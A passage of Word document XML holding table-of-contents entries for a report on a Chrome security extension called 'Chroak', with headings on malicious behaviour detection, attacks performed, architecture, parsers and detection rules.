        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Malicious Behavior Detection</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_Toc523071503 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E37E8E3" w14:textId="16C4810D" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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04" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>2.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Chroak Extension</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_Toc523071504 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="21EE3B83" w14:textId="23C93D5D" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071505" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>2.2.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Information Gathered</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_Toc523071505 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B6DCB68" w14:textId="2E38589A" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="960"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071506" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>2.2.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Attacks Performed</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_Toc523071506 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>19</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E21452C" w14:textId="234ABDD5" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071507" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>3.</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>DESIGN</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071507 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D679481" w14:textId="50C3C973" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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08" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>3.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Architecture</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_Toc523071508 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="39B90BCE" w14:textId="103FF095" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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09" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>3.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Native Messaging Host</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_Toc523071509 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0B06A9E4" w14:textId="0D303655" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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10" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>3.3</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Parsers</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_Toc523071510 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="19B05151" w14:textId="5DB4E609" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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11" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>3.4</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rules</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_Toc523071511 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>21</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1C2C60D4" w14:textId="72407024" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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12" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>3.5</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Running the extension</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_Toc523071512 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>22</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D8B54AB" w14:textId="019C5B27" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071513" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>IMPLEMENTATION DETAILS</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071513 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="153C120B" w14:textId="21F637F0" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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14" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 1: Denying the access to Chrome’s extensions configuration page.</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_Toc523071514 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C8CF575" w14:textId="5635A79C" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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15" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 2: DoS.</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_Toc523071515 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
